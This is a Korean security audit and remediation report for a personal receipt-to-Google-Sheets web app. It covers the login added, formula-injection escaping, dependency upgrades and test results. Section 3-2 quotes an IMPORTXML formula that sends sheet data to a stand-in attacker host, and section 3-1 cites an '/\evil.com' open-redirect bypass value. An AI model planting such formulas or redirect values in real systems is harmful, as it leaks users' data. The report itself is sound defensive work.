# ReceiptLens 보안 점검 및 조치 보고서

- 작성일: 2026-11-04
- 기준: Claude Code `security-guidance@claude-plugins-official` (v2.0.17) 플러그인의 점검 항목
- 원칙: **추가 비용 0원** (외부 인증 서비스·유료 인프라 사용 안 함, CLAUDE.md Hard Constraints 준수)

---

## 1. 점검 방법

security-guidance 플러그인은 세 단계로 동작합니다.

| 단계 | 동작 시점 | 내용 |
|---|---|---|
| 패턴 경고 | Claude가 파일을 수정할 때 | `eval`, `innerHTML`, `dangerouslySetInnerHTML`, 하드코딩된 비밀값 등 약 25개 위험 패턴 감지 |
| LLM 변경분 리뷰 | Claude의 턴이 끝날 때 | 변경된 diff를 Opus 모델이 검토 |
| 커밋 리뷰 | `git commit` / `git push` | 관련 파일을 따라가며 여러 파일에 걸친 취약점(IDOR, 인증 우회, SSRF 등) 검토 |

이 플러그인은 **새로 바뀌는 코드만** 검사하고 이미 있는 코드는 스캔하지 않습니다. 그래서 같은 취약점 분류(인젝션, XSS, SSRF, 비밀값 노출, 인증 우회, 입력 검증 등)를 기준으로 기존 코드 전체를 직접 점검했고, `npm audit`과 git 히스토리 비밀값 검색도 함께 실행했습니다.

---

## 2. 발견 사항 요약

| # | 심각도 | 항목 | 조치 |
|---|---|---|---|
| 1 | 🔴 높음 | API 라우트에 인증 없음 (누구나 시트 쓰기·덮어쓰기, Gemini 한도 소진 가능) | ✅ 해결 |
| 2 | 🔴 높음 | Google Sheets 수식 인젝션 (`USER_ENTERED` 모드) | ✅ 해결 |
| 3 | 🔴 높음 | 의존성 취약점 8건 (Next.js **critical** 포함) | ✅ 해결 (0건) |
| 4 | 🟡 중간 | 서버 측 입력 크기·형식 제한 없음 | ✅ 해결 |
| 5 | 🟢 낮음 | googleapis 원본 에러 메시지 클라이언트 노출 | ✅ 해결 |
| 6 | 🟢 낮음 | `NEXT_PUBLIC_GOOGLE_SHEET_URL` 번들 포함 | ⚠️ 사용자 확인 필요 (시트 공유 설정) |
| - | 버그 | 수정 모달의 Sheets 등록 확인 요청에 `date` 누락 → 항상 "미등록" 경고 | ✅ 해결 |

### 원래 잘 되어 있던 부분
- git 히스토리 전체에서 실제 API 키·개인 키가 발견되지 않음 (`AIza…`, `BEGIN PRIVATE KEY` 검색, 예시값만 존재)
- `.gitignore`가 `.env*`, `*.json`(필수 설정 파일 제외)을 차단
- Gemini 키·서비스 계정 키는 서버 코드(`lib/`, `app/api`)에서만 사용
- 플러그인이 경고하는 위험 패턴(`dangerouslySetInnerHTML`, `innerHTML`, `eval`, `new Function` 등) 없음
- 시트 이름은 `YYYY-MM-DD`로 검증된 날짜로 만들어서 범위(range) 인젝션 불가

---

## 3. 조치 내용 상세

### 3-1. 비밀번호 로그인 + 세션 쿠키 인증 (항목 1)

외부 서비스 없이 환경변수 하나(`APP_PASSWORD`)로 동작하는 개인용 인증을 추가했습니다.

| 파일 | 내용 |
|---|---|
| `lib/auth.ts` (신규) | 비밀번호 검증, 세션 토큰 생성·검증(HMAC-SHA256, 타이밍 공격 방지 비교), Origin 검사 |
| `proxy.ts` (신규) | Next.js 16의 Proxy(구 Middleware). `/login`, `/api/auth`를 뺀 모든 경로 보호. 미로그인 시 페이지는 `/login`으로 이동, API는 401 |
| `app/api/auth/route.ts` (신규) | `POST` 로그인(쿠키 발급) / `DELETE` 로그아웃 |
| `app/login/page.tsx` (신규) | 로그인 화면 (기존 디자인 원칙 적용, `?next=`는 내부 경로만 허용해 오픈 리다이렉트 방지). 플러그인 리뷰 지적에 따라 `/\evil.com` 같은 역슬래시 우회까지 막도록 현재 origin 기준으로 해석해 비교하게 보강 |
| `app/api/sheets/route.ts`, `app/api/analyze/route.ts` | 각 라우트에서도 `isAuthenticated()` 재확인 (심층 방어: Next.js 공식 문서도 Proxy만으로 권한 검사를 끝내지 말라고 권장) |

동작 방식:
- 세션 쿠키 `rl_session` = `HMAC(APP_PASSWORD, 고정 문자열)` → **비밀번호를 바꾸면 모든 기존 세션이 즉시 무효화**됩니다.
- 쿠키 속성: `HttpOnly` + `SameSite=Strict` + `Secure`(운영 환경만) + 30일 유지
- `APP_PASSWORD`가 없거나 8자 미만이면 **전체 차단**(fail-closed). 설정을 깜빡해도 앱이 공개 상태가 되지 않습니다.
- 비밀번호가 틀리면 응답을 1초 늦춰서 무차별 대입 속도를 줄입니다.
- 상태를 바꾸는 요청(POST/PUT/DELETE)은 `Origin` 헤더가 같은 출처일 때만 허용합니다 (CSRF 이중 방어).

### 3-2. 수식 인젝션 방지 (항목 2)

`lib/google-sheets.ts`에 `escapeFormula()`를 추가하고, 행 추가(`appendReceiptToSheet`)·수정(`updateReceiptInSheet`) 시 **상호명(F), 항목(G), 메모(H)** 열에 적용했습니다.

- `=`, `+`, `-`, `@`, 탭, CR로 시작하면 앞에 `'`를 붙여 일반 텍스트로 저장합니다. 셀에 따옴표는 보이지 않습니다.
- 날짜(E) 열은 `USER_ENTERED`를 유지해서 날짜 서식이 그대로 동작합니다.
- 공격 예시: 영수증에 `=IMPORTXML("https://attacker/?d="&C3, …)`가 인쇄돼 있으면 Gemini가 이를 상호명으로 읽고, 이전 코드에서는 수식이 실행돼 시트 데이터가 외부로 전송될 수 있었습니다.

| 입력 | 저장값 |
|---|---|
| `=IMPORTXML("x")` | `'=IMPORTXML("x")` (텍스트) |
| `+82-10` | `'+82-10` (텍스트) |
| `스타벅스` | `스타벅스` (변화 없음) |

### 3-3. 의존성 업그레이드 (항목 3)

| 패키지 | 이전 | 이후 |
|---|---|---|
| `next` | 16.2.4 (critical) | **16.4.5** |
| `eslint-config-next` | 16.2.4 | 16.4.5 |
| `zod` | ^4.4.3 (high) | ^4.6.7 |

`npm audit --omit=dev` 결과: **8건 → 0건**

### 3-4. 서버 측 입력 검증 (항목 4)

- `/api/analyze`
  - data URL 형식 검사, MIME 화이트리스트(`image/jpeg|png|webp|heic|heif`)
  - 서버에서 5MB 제한 (413 응답). 클라이언트가 1920px로 압축해서 보내므로 정상 사용에는 영향 없음
- `lib/validators.ts`
  - `storeName` 100자, `category` 50자, `memo` 500자, 금액 1조 원 상한
  - `ReceiptIdSchema` 추가: `id`는 UUID 형식만 허용 (POST/PUT/GET `checkId`)

### 3-5. 에러 메시지 정리 (항목 5)

- `toSheetsErrorMessage(err)`: googleapis 에러 코드를 CLAUDE.md에 정한 고정 메시지(401/403 권한, 404 시트 없음, 그 외 연결 오류)로 변환
- 코드에서 직접 작성한 안내 메시지(환경변수 누락, 행 없음 등)는 `SheetsUserError`로 구분해 그대로 표시
- 원본 에러는 서버 로그(`console.error`)에만 남김

### 3-6. 기타

- `components/dashboard/EditReceiptModal.tsx`: Sheets 등록 확인 요청에 `date`를 추가 (기존에는 빠져 있어서 항상 "미등록" 경고가 떴음)
- `.claude/claude-security-guidance.md` (신규): 플러그인 LLM 리뷰가 이 프로젝트 규칙(인증 재확인, `escapeFormula` 사용, 비밀값 비노출 등)을 함께 검사하도록 등록
- `CLAUDE.md`, `README.md`: 환경변수(`APP_PASSWORD`), 보안 규칙, 버전 정보 갱신

---

## 4. SameSite 쿠키 — 이 프로젝트에 적용하는 게 맞는가?

### SameSite란
쿠키에 붙이는 속성으로, **다른 사이트에서 시작된 요청에도 이 쿠키를 같이 보낼지** 정합니다. 주된 목적은 CSRF(사이트 간 요청 위조) 방지입니다. 사용자가 로그인한 상태에서 악성 사이트를 열었을 때, 그 사이트가 몰래 우리 앱으로 요청을 보내도 쿠키가 따라가지 않게 막습니다.

| 값 | 다른 사이트에서 시작된 요청 | 용도 |
|---|---|---|
| `Strict` | 항상 쿠키 미전송 (링크 클릭으로 들어와도 미전송) | 가장 엄격 |
| `Lax` | 링크 클릭 같은 최상위 GET 이동만 전송, POST·fetch·iframe은 미전송 | 대부분 브라우저의 기본값 |
| `None` | 항상 전송 (`Secure` 필수) | 다른 사이트에 임베드되는 위젯, 외부 결제/로그인 콜백 |

### 결론: **적용하는 게 맞습니다. 다만 "인증과 함께"일 때만 의미가 있고, 값은 `Strict`를 택했습니다.**

1. **점검 시점의 코드에는 SameSite를 붙일 대상이 없었습니다.** 앱이 쿠키를 전혀 쓰지 않고 인증 자체가 없었기 때문입니다. 그 상태에서 진짜 문제는 CSRF가 아니라 "아무나 API를 직접 호출할 수 있다"는 점이었습니다(항목 1). SameSite만 따로 적용하는 건 의미가 없었습니다.
2. **이번에 쿠키 기반 로그인을 넣었으니 이제는 필수입니다.** 쿠키 인증은 브라우저가 쿠키를 자동으로 붙여 보내므로, SameSite가 없으면 CSRF 공격(예: 악성 페이지가 `/api/sheets`로 가짜 영수증 POST)이 가능해집니다.
   - 참고: 현재 API는 `req.json()`이 Content-Type을 확인하지 않아서, `text/plain` 폼 전송처럼 CORS 사전 요청(preflight)을 거치지 않는 방식으로도 JSON 본문을 보낼 수 있습니다. 그래서 SameSite 방어가 실제로 필요합니다.
3. **`Lax`가 아니라 `Strict`를 고른 이유**
   - 개인용 단일 사이트 앱이라 다른 사이트에서 링크로 들어올 일이 거의 없습니다.
   - `Lax`가 필요한 대표 사례는 외부 OAuth 로그인 콜백인데, 이 프로젝트는 CLAUDE.md에서 **OAuth를 금지**하고 있습니다.
   - 단점: 메신저·메일 등 다른 사이트의 링크를 눌러 들어오면 첫 화면에서 로그인 페이지가 한 번 나올 수 있습니다. 주소창 입력, 북마크, 홈 화면 바로가기로 열면 문제없습니다. 불편하면 `app/api/auth/route.ts`에서 `'lax'`로 바꿔도 됩니다(상태를 바꾸는 GET 요청이 없어서 `Lax`도 안전합니다).
   - `None`은 다른 사이트에 임베드할 일이 없으므로 쓸 이유가 없습니다.
4. **SameSite만 믿지 않도록 보완한 점**
   - SameSite는 "출처(origin)"가 아니라 "사이트" 단위로 판단합니다. 같은 사이트의 다른 서브도메인에서 온 요청은 같은 사이트로 취급될 수 있고, 아주 오래된 브라우저는 SameSite를 지원하지 않습니다.
   - 그래서 `proxy.ts`에서 **Origin 헤더 검사**를 추가로 넣었습니다 (테스트 5번: 다른 출처의 POST → 403).
   - `HttpOnly`도 함께 설정해서, 만약 XSS가 생겨도 스크립트(`document.cookie`)로 쿠키를 훔칠 수 없습니다.

### 주의: `Secure` 속성과 로컬 네트워크 접속
- `Secure` 쿠키는 HTTPS에서만 저장됩니다. 그래서 운영 빌드(`NODE_ENV=production`)에서만 켭니다.
- `npm run dev`(개발 모드)와 Vercel·Cloudflare Tunnel(HTTPS)은 문제없습니다.
- **`npm run build && npm start`로 운영 빌드를 띄우고 휴대폰에서 `http://192.168.0.16:3000`으로 접속하면 로그인이 유지되지 않습니다.** 이때는 Cloudflare Tunnel(https) 주소로 접속하세요.

---

## 5. 검증 결과

- `npx tsc --noEmit`: 통과
- `npm run build`: 성공 (`/api/auth`, `/login`, `Proxy` 포함)
- `npm run lint`: 에러 3건은 **이번 작업 전부터 있던 것**(`useReceipts.ts`, `useDailyCount.ts`의 effect 내 setState, `google-sheets.ts:188` non-null assertion). 이번 변경으로 새로 생긴 에러는 없습니다.
- 운영 빌드 서버(임시 비밀번호)로 실제 요청 테스트. Sheets·Gemini API는 호출하지 않아 비용 0원:

| # | 테스트 | 결과 |
|---|---|---|
| 1 | 미로그인 상태로 `/` 접속 | 307 → `/login?next=/` ✅ |
| 2 | 미로그인 `GET /api/sheets` | 401 ✅ |
| 3 | 미로그인 `POST /api/analyze` | 401 ✅ |
| 4 | 틀린 비밀번호 | 401 (1초 지연) ✅ |
| 5 | 다른 출처(Origin)에서 POST | 403 ✅ |
| 6 | 올바른 비밀번호 | 200 + `HttpOnly; Secure; SameSite=strict` 쿠키 ✅ |
| 7 | 로그인 후 `/` 접속 | 200 ✅ |
| 8 | UUID가 아닌 `id` (`=1+1`) | 400 ✅ |
| 9 | 메모 600자 | 400 ✅ |
| 10 | `text/html` data URL을 analyze로 전송 | 400 ✅ |
| 11 | 위조 쿠키 (`rl_session=deadbeef`) | 401 ✅ |

---

## 6. ⚠️ 사용자가 직접 해야 할 일

1. **`.env.local`에 `APP_PASSWORD` 추가** (8자 이상, 길고 추측하기 어렵게). 지금은 설정돼 있지 않아서, 추가하기 전까지 로컬에서도 모든 화면이 차단됩니다.
   ```bash
   APP_PASSWORD=여기에-긴-비밀번호
   ```
2. **Vercel에 배포했다면** Project Settings → Environment Variables에 `APP_PASSWORD` 추가 후 재배포
3. **Google 시트 공유 설정 확인**: "링크가 있는 모든 사용자"가 아니라 "제한됨"(본인 + 서비스 계정 이메일만)인지 확인 (항목 6)
4. 변경 사항 커밋. 커밋하면 security-guidance 플러그인의 커밋 리뷰가 자동으로 한 번 더 검사합니다.

---

## 7. 남은 한계 (비용 0원 범위에서 의도적으로 하지 않은 것)

- **로그인 시도 횟수 제한**: 서버리스(Vercel) 환경에서 영구 카운터를 두려면 Redis 같은 외부 저장소(Upstash 등 유료/금지 서비스)가 필요해서 1초 지연만 적용했습니다. **긴 비밀번호**를 쓰는 것으로 보완하세요.
- **사용 중 세션 만료 처리**: 30일이 지나 쿠키가 만료되면 API가 "로그인이 필요합니다." 오류를 보여줍니다. 새로고침하면 로그인 화면으로 이동합니다(자동 이동은 없음).
- **로그아웃 버튼 UI 없음**: `DELETE /api/auth`는 있지만 화면 버튼은 추가하지 않았습니다. 필요하면 추가할 수 있습니다.
- **단일 사용자 전제**: 비밀번호 하나를 공유하는 구조입니다. 여러 사람이 각자 계정을 써야 한다면 설계를 바꿔야 합니다.
- **문서 불일치 (보안 무관, 수정 안 함)**: CLAUDE.md의 Gemini 모델명(`gemini-2.5-flash-preview-04-17`)과 실제 코드(`gemini-2.5-flash-lite`)가 다르고, 클라이언트 원본 파일 제한은 20MB(압축 전)입니다.

---

## 8. 변경 파일 목록

```
신규
  lib/auth.ts
  proxy.ts
  app/api/auth/route.ts
  app/login/page.tsx
  .claude/claude-security-guidance.md
  SECURITY_REPORT.md (이 문서)

수정
  app/api/analyze/route.ts      인증 재확인, MIME·크기 제한
  app/api/sheets/route.ts       인증 재확인, UUID 검증, 에러 메시지 정리
  lib/google-sheets.ts          escapeFormula, toSheetsErrorMessage, SheetsUserError
  lib/validators.ts             길이·금액 상한, ReceiptIdSchema
  components/dashboard/EditReceiptModal.tsx   checkId 요청에 date 추가
  package.json, package-lock.json             next 16.4.5, zod 4.6.7
  README.md, CLAUDE.md          환경변수·보안 규칙·버전 갱신
```

---

## 9. 2차 작업: 코드 감사(ponytail) 14건 조치 + 보안 재점검 (2026-11-04)

`ponytail` 플러그인의 `/ponytail-audit`으로 전체 코드를 감사해서 14건을 찾았고, 모두 고쳤습니다. 수정 후 보안을 한 번 더 점검했습니다.

### 9-1. 조치 내역

| # | 문제 | 조치 | 파일 |
|---|---|---|---|
| 1 | 스캐너에서 고친 날짜·상호·금액이 앱 목록에 반영 안 됨 | 전송 성공 시 보낸 값을 통째로 저장 | `hooks/useReceipts.ts` (`syncReceipt`) |
| 2 | 수정 창에서 다른 달로 날짜를 바꾸면 "행 없음" 실패 | `originalDate`를 함께 보내고, 달이 다르면 이유를 알려주는 400 응답 | `app/api/sheets/route.ts`, `EditReceiptModal.tsx` |
| 3 | 전송된 영수증은 "선택 삭제" 불가 (없는 DELETE API 호출) | 앱 목록에서만 삭제하고 "시트에서는 직접 지워주세요" 안내 | `app/page.tsx` |
| 4 | 날짜 없는 영수증에 AI가 엉뚱한 날짜를 씀 | 호출마다 한국 시간 기준 오늘 날짜를 프롬프트에 넣음 | `lib/gemini.ts` (`buildReceiptPrompt`) |
| 5 | 1장 전송에 Sheets API 약 12회 → 여러 장이면 분당 60회 한도 초과 | 정산 수식을 `=SUM(I$2:INDEX(I:I,ROW()-1))`로 바꿔 다시 쓸 필요를 없앰. 서식은 시트 생성 때만 적용. **1장당 약 12회 → 5회** | `lib/google-sheets.ts` |
| 6 | AI가 금액에 `null`을 주면 서버 500 | `parseCurrency`가 NaN을 돌려줘서 422로 처리. AI 응답이 객체가 아니어도 422 | `lib/validators.ts`, `app/api/analyze/route.ts` |
| 7 | 서버 재시도가 빈 행·중복 행을 남김, 중복 검사가 오류를 삼킴 | 서버 재시도 제거. `checkDuplicate`는 "시트 없음"만 false, 다른 오류는 그대로 던짐 | `app/api/sheets/route.ts`, `lib/google-sheets.ts` |
| 8 | 분석 중 페이지를 떠나면 빈 "대기" 영수증이 남음 | 불러올 때 내용이 빈 pending 항목을 자동 제거 (뒤로가기·새로고침·탭 닫기 모두 해결) | `hooks/useReceipts.ts` |
| 9 | 하루 사용 횟수가 오전 9시에 초기화 (UTC 기준) | 한국 시간 기준 날짜 사용 | `hooks/useDailyCount.ts` |
| 10 | 위험 로직에 테스트 없음 | Node 내장 테스트 6개 추가 (`npm test`, 설치 패키지 없음) | `tests/core.test.ts` |
| 11 | 전송 코드가 4곳에 복사, 같은 타입이 2개 | `syncReceipt` 하나로 통합, `SyncData` 타입 하나로 통합 | `useReceipts.ts`, `lib/types.ts` |
| 12 | 저장만 하고 읽지 않는 이미지 저장소(IndexedDB) | `lib/imageDB.ts` 삭제, 브라우저에 남은 옛 데이터는 1회 정리 | `lib/imageDB.ts`(삭제), `useReceipts.ts` |
| 13 | 쓰이지 않는 코드 | `hooks/useCamera.ts`, `removeReceipts`, 주석 처리된 시트 삭제 함수 삭제 | |
| 14 | `/api/sheets` GET이 인증 코드를 중복 구현 | `getTodayRows()`로 옮기고 공용 인증 재사용 | `lib/google-sheets.ts` |

추가로 같이 고친 것:
- **날짜 검증 강화:** 날짜는 실제 존재하는 날짜만 받습니다(`DateSchema`). 예를 들어 `2026-02-30`이 들어와도 엉뚱한 월 시트가 생기지 않습니다.
- **한도 초과 안내:** Sheets 한도(429)에 걸리면 "1분 뒤 다시 시도" 메시지를 보여줍니다.
- **정산 수식 자동 교체:** 예전 형식 수식(`SUM(I3:I7)`)이 있는 기존 월 시트는 다음 전송 때 정산 수식을 새 형식으로 1회 교체합니다. 추가 API 호출은 없습니다.

결과: 코드 약 **500줄 감소** (18개 파일, +498 / −993, 1차 보안 작업 포함 기준)

### 9-2. 보안 재점검 결과

| 항목 | 결과 |
|---|---|
| `npm audit --omit=dev` | 0건 ✅ |
| 클라이언트 번들(`.next/static`)에 비밀값·`googleapis` 포함 여부 | 없음 ✅ |
| 위험 패턴 (`innerHTML`, `eval`, `new Function`, CORS 허용 헤더 등) | 없음 ✅ |
| 클라이언트 코드가 서버 전용 `lib/` 모듈 import | 없음 ✅ (`lib/types.ts`의 타입만) |
| API 응답에 원본 `err.message` 노출 | 없음 ✅ |
| 새로 추가된 경로(`getTodayRows`, PUT `originalDate`)의 인증·검증 | 모두 `isAuthenticated` + 스키마 검증 거침 ✅ |

운영 빌드로 실제 요청 테스트 (Sheets·Gemini 호출 없음, 비용 0원):

| # | 테스트 | 결과 |
|---|---|---|
| 1 | 미로그인 GET /api/sheets | 401 ✅ |
| 2 | 미로그인 PUT | 401 ✅ |
| 3 | 로그인 상태에서 다른 출처 PUT (CSRF) | 403 ✅ |
| 4 | 위조 쿠키로 analyze | 401 ✅ |
| 5 | checkId에 범위 주입(`date=2026-11-04!A1`) | 400 ✅ |
| 6 | checkId 날짜 누락 | 400 ✅ |
| 7 | 존재하지 않는 날짜(2026-02-30) | 400 ✅ |
| 8 | body가 `null` | 400 ✅ |
| 9 | PUT으로 다른 달 이동 | 400 + 안내 메시지 ✅ |
| 10 | DELETE | 405 ✅ |
| 11 | analyze 5MB 초과 | 413 ✅ |

검증: `tsc` 통과, `npm test` 6/6 통과, `npm run build` 성공, lint 에러 3 → 2건 (남은 2건은 원래 있던 `useReceipts`/`useDailyCount`의 effect 내 setState).

### 9-3. 남은 한계
- **동시 전송:** 휴대폰과 PC에서 **정확히 같은 순간에** 전송하면 같은 행 위치를 잡아서 한 건이 덮어써질 수 있습니다. 한 사람이 쓰는 앱이라 남겨두었습니다.
- **정산 수식 실제 동작:** 새 정산 수식과 예전 시트 자동 교체는 실제 Google Sheets에서 실행해 보지 않았습니다. 이번 달 시트에 영수증 1장을 보내서 정산·잔액 값이 맞는지 한 번 확인해 주세요.
- **"전체 승인"의 분류:** 일괄 전송은 분류가 비어 있으면 첫 번째 분류로 보냅니다(기존 동작 유지).

---

## 10. 3차 변경: SameSite Strict → Lax, 세션 만료 서버 검사 (2026-11-08)

| 변경 | 이유 |
|---|---|
| 세션 토큰에 만료시각을 넣고 서명(`만료시각.HMAC`) | 커밋 리뷰(security-guidance) 지적: 쿠키 유출 시 무기한 사용 가능 → 이제 30일 후 서버에서 무효 |
| `SameSite=Strict` → `Lax` | 메일·Vercel 화면 링크로 들어오면 쿠키가 안 가서 **매번 로그인**되는 문제. 4장에서 예상한 단점이 실제로 발생 |

**Lax로 바꿔도 안전한 이유**
- Lax는 다른 사이트에서 오는 **링크 이동(GET)** 에만 쿠키를 보내고, 다른 사이트발 POST·PUT·fetch에는 보내지 않습니다.
- 이 앱에서 데이터를 바꾸는 요청은 모두 POST/PUT이므로 CSRF 방어는 그대로입니다. Origin 검사도 유지합니다.
- 규칙: **데이터를 바꾸는 GET 라우트는 만들지 않는다** (CLAUDE.md, 보안 리뷰 규칙에 반영).
